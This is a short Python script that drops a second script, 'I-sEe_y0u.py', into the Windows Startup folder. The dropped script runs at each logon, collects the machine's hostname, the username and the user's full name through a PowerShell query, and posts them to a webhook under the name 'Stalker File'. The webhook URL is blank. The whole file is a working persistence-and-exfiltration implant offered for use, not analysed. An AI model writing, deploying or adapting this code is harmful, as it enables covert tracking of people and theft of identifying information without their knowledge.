import os
import shutil

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

file_path = os.path.join(startup_folder, 'I-sEe_y0u.py')

python_script = r"""import requests
import json
from datetime import datetime
import platform
import os
import subprocess

dt = datetime(2024, 8, 16, 14, 30)
date = dt.strftime('%Y-%m-%d %H:%M:%S')

webhook_url = ''


host_name = platform.node()
user_full_name = subprocess.check_output(['powershell', '(Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName']).decode().strip()
user_name = os.getenv('USERNAME')

data = {
    'content': f'[{date}] {user_name} just connected to his computer\n| Hostname: {host_name}\n| Full Name: {user_full_name}',
    'username': 'Stalker File',
    'avatar_url': ''
}

response = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})"""

with open(file_path, 'w') as file:
    file.write(python_script)